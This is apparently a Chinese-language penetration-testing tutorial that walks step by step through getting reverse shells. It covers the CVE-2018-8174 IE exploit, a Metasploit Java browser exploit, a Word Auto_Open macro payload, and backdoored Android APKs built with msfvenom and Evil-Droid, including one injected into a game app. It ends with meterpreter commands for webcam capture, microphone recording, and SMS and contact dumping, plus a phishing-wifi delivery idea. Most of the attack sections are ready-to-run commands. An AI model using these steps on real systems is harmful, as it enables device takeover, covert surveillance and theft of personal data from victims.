# 利用 0day 双杀-java 环境-宏感染-安卓客户端渗透

#### 利用 0DAY 漏洞 CVE-2018-8174 获取 shell

> ​	0DAY 漏洞 最早的破解是专门针对软件的，叫做 WAREZ，后来才发展到游戏，音乐，影视等其他
> 内容的。0day 中的 0 表示 zero，早期的 0day 表示在软件发行后的 24 小时内就出现破解版本，现在我
> 们已经引申了这个含义，只要是在软件或者其他东西发布后，在最短时间内出现相关破解的，都可以叫
> 0day。 0day 是一个统称，所有的破解都可以叫 0day。
>
> ​	CVE-2018-8174 漏洞影响最新版本的 IE 浏览器及使用了 IE 内核的应用程序。用户在浏览网页或打
> 开 Office 文档时都可能中招，最终被黑客植入后门木马完全控制电脑。微软在 2018 年 4 月 20 日早上
> 确认此漏洞，并于 2018 年 5 月 8 号发布了官方安全补丁，对该 0day 漏洞进行了修复，并将其命名为
> CVE-2018-8174。

###### 1、安装 CVE-2018-8174_EXP

使用 Xshell 上传 CVE-2018-8174 的 EXP 到 Kali

```
 unzip CVE-2018-8174_EXP-master.zip
```

###### 2、生成恶意 html 文件

```
cd CVE-2018-8174_EXP-master/
ls

		CVE-2018-8174.py README.md

python CVE-2018-8174.py -u http://192.168.1.53/exploit.html -o hack.rtf -i 192.168.1.53 -p 4444
```

```
参数说明：
-u：URL 地址，恶意 html 文件 hack.html 的访问地址
-o：生成文档
-i：监听地址
-p：监听端口
```

恶意 html 文件生成成功：

###### 3、将恶意 html 文件移动到网站根目录

```
cp exploit.html /var/www/html/
systemctl start apache2		#启动 apache2 服务
```

###### 4、新打开一个终端 CTRL+SHIFT+T，生成 MSF 监听

```
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.53
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

###### 5、受害者点击恶意链接

```
进入 win7，打开IE（要新版本的）浏览器或是IE内核的浏览器，比如 360 浏览器（貌似没用），访问恶意链接
http://192.168.36.136/exploit.html
```

###### 6、返回 kali 查看已经建立会话

#### 基于 java 环境的漏洞利用获取 shell

###### 1、搭建 java 环境

> 第一步我们先安装 java 环境上传 jre 到 win7 或 xp 操作系统
> 注：通过此案例，告诉大家，软件升级还是很重要的。

###### 2、实战-使用 java 模块 getshell

```
msf6 > use exploit/multi/browser/java_jre17_driver_manager
msf6 exploit(multi/browser/java_jre17_driver_manager) > show options

注：看到这里 target 是一个通用的 java payload。 我们可以自己指定一个，也可以使用默认指定
的 payload。

msf6 exploit(multi/browser/java_jre17_driver_manager) > show payloads 
			#查看此 java模块可以使用的 payloads
			
msf6 exploit(multi/browser/java_jre17_driver_manager) > set payload java/meterpreter/reverse_tcp
msf6 exploit(multi/browser/java_jre17_driver_manager) > set LHOST 192.168.1.53
msf6 exploit(multi/browser/java_jre17_driver_manager) > jobs -K
msf6 exploit(multi/browser/java_jre17_driver_manager) > exploit

如果出现错误提示，说明 4444 端口被占用
lsof -i:4444 		#查看占用 4444 端口的进行 ID
kill -9 1945		#然后将该进程杀死
或者jobs -K

msf6 exploit(multi/browser/java_jre17_driver_manager) > exploit
会出现恶意地址
```

在 win7 上安装 java 环境

```
win7 主机访问 刚刚msf出现的地址
	提示我们 java 版本需要更新我们点击 later 先不更新
	然后我们发现运行了一个 java 程序,但是用户关闭了 java 程序也不影响我们 session 的正常访问。
	此时已经建立session，按下回车在sessions 查看就可
```

回到 MSF 控制台

```
msf6 exploit(multi/browser/java_jre17_driver_manager) > sessions -i 1
meterpreter > getuid 

		Server username: Administrator
```

> 只在某个版本的IE中有用
>

#### 利用宏感染 word 文档获取 shell

> office 2016 下载地址：
> 链接：https://pan.baidu.com/s/1LzbgyjBYAL0sfsQoePLfzA 
> 提取码：5ksy
>
> 适用于office2010,2016

- 首先将 office 2016.zip 上传到 win7 虚拟机上，解压后，安装一下 office。

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp 
LHOST=192.168.1.53 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe
```

```
执行完成后会生成 2 段代码
第一段代码是 MACRO CODE [ˈmækrəʊ kəʊd] 宏代码
第二段代码 payload。			# *号中的内容不要
```

- 打开 Word 新建空白文档，在视图中新建宏		宏名 Auto_Open >> 创建

- 清除默认的代码，复制第一段 code 代码内容到编辑器中，然后返回到 Word 内容编辑区（按左上角Word的图标）。

- 复制第二段代码 payload 到 word 正文，然后保存文档（可隐藏）。

- 按 Ctrl+s 保存

```
MSF 配置侦听
msf6 exploit(multi/browser/java_jre17_driver_manager) > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.53
msf6 exploit(multi/handler) > jobs -K
msf6 exploit(multi/handler) > exploit
```

配置好侦听之后我们打开我们制作的 word 文档，文档一旦打开就会执行 payload 连接到
MSF，关闭 word 文档之后 session 不受影响。
打开之后我们回到 MSF 控制台，Session 已经建立

```
meterpreter > getuid 

		Server username: XUESHEN\Administrator
		
我们尝试把 payload 转移到其他进程
meterpreter > getpid 		#获取当前进程 pid
Current pid: 2932
meterpreter > ps 			#查看进程列表，在 ps 列出的进程列表，倒数第 4 个就是我们进程的 pid
```

#### 安卓客户端渗透（暂未实验）

- 同样的我们可以通过 MSF 生成一个 apk 的后门应用。

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 
R > xuegod.apk
```

- 下载至安卓手机进行安装，安装时修改一下后台权限。以免断开。

```
msfdb run
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.53
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > exploit
```

- 手机端点击打开 APK

```
meterpreter > ifconfig
```

由于我这边演示用的手机操作系统定制化程度较高，所以其他功能就没办法测试了，需要大家自行测
试。

```
常用命令解释

Stdapi: Webcam Commands
===================================

webcam_list 			列出网络摄像头
record_mic 				[ˈrekərd]/记录/ 从默认麦克风录制音频为 X 秒
webcam_chat 			开始视频聊天
webcam_snap 			从指定的摄像头获取快照
webcam_stream -i 1		从指定的网络摄像头播放视频流[选择后摄像头]

Android Commands
=================

activity_start 			从 URI 字符串启动 Android 活动
check_root 				检查设备是否有根
dump_calllog 			获取调用日志
dump_contacts 			获取联系人列表
dump_sms 				获取短信
geolocate 				利用地理定位获取当前 LAT
wlan_geolocate 			利用 WLAN 信息获取当前 LAT
hide_app_icon 			从发射器隐藏应用程序图标
interval_collect 		管理区间收集能力
send_sms 				从目标会话发送短消息
set_audio_mode 
sqlite_query 			从存储库查询 SQLite 数据库
wakelock 				启用/禁用 Wakelock

meterpreter > cd /
meterpreter > ls
```

> 其他功能自测，关于渗透思路，可以将 payload 注入到正常的 apk 中，构建一个钓鱼 wifi，比如说
> 设置一个没有密码的钓鱼 wifi，需要下载软件才可以正常上网，用户下载运行软件后即被远程控制。
> 安卓客户端渗透目前来说已经是 CTF 中的一个非常重要的分类了，但是通常的它更多的是二进制层
> 面的博弈，如果仅仅是在 apk 中注入后门可能非常简单，但通常需要的是一系列的攻击手段来辅助完成
> 的。所以这里仅做简单介绍，并不深入研究。

###### 注入到隐藏游戏 APP 中（请勿在 Kali 2019.4 版本中操作，可能存在兼容问题。）

```
禁用 IPv6

echo "net.ipv6.conf.eth0.disable_ipv6 = 1" >> /etc/sysctl.conf
sysctl -p
ifconfig
```

```
安装 Evil-Droid 工具
上传 master 到 Kali。注意文件名没有.zip 后缀所以不能补齐，需要手工输入。

unzip master
cd Evil-Droid-master/
程序默认 ping google.com 来判断是否联网，国内是不能正常访问的，修改为百度。

vim evil-droid
改：40 ping -c 1 google.com > /dev/null 2>&1
为：40 ping -c 1 baidu.com > /dev/null 2>&1

改：删除标红字段,该参数会报错。
649 xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e 
"msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD 
$PAYLOAD; exploit'"
为：
649 xterm -T "EVIL-DROID MULTI/HANDLER" -fs 10 -bg black -e "msfconsole -x 'use 
multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"

chmod +x evil-droid		#添加执行权限
```

上传游戏安装包，游戏为 3D 摩托飞车
└─# rz
升级 apktool.jar，该工具用于逆向 apk 文件。它可以将资源解码，并在修改后可以重新构建它们。
它还可以执行一些自动化任务，例如构建 apk。工具包中默认版本为 2.2 已经过期需要升级至 2.4。
└─# cd tools/
└─# rm -rf apktool.jar
└─# rz
以下所有操作直接在 Kali 中进行，请勿使用 xshell 连接。
└─# cd .. 
└─# ./evil-droid
默认会检查依赖，如果没找到会自动安装。
点击确认后会自动启动数据库和 apache
选择 3
生成 payload，生成方式与 msfvenom 一致。
设置端口号
Payload apk 名称保持默认
根据需求选择 payload，一般选择第四个即可。
选择 Evil-Droid-master 目录下的 3d.apk
开始对 APK 进行注入后门
生成一个密钥，编译 apk 程序所需。
生成带有后门的 APK 程序
APK 存放路径/root/Evil-Droid-master/evilapk/evilapk.apk
你可以通过 sz 到本地发送给手机，也可以复制到/var/www/html/使用 http 方式下载到手机，前
面程序也帮我们开启了 apache2，你可以通过任意方式将 APK 发送至手机进行安装。（安装过程这里不
过多赘述，和上面 MSF 生成的程序安装并无不同。）
点击确定后会自动打开 MSF 进行侦听。
如果嫌弃 MSF 的窗口太小可以关闭手动启动侦听。
关闭 MSF 后选择退出程序。
手动启动侦听

```
msfdb run
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.53
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > exploit
```

手机安装运行APP即可建立session如果你的app闪退，请重新生成。以及重启手机。废话不多说我们先拍个照。

```
meterpreter > webcam_list
meterpreter > webcam_snap -i 1
```

> 注意！！！拍照可能会有提醒，比如程序请求访问相机权限，允许即可，我可能之前点过允许但是卸载
> 后系统记住了我的选择，即使我重新安装 APP 也没有相关提示。
> 存放路径为程序目录下。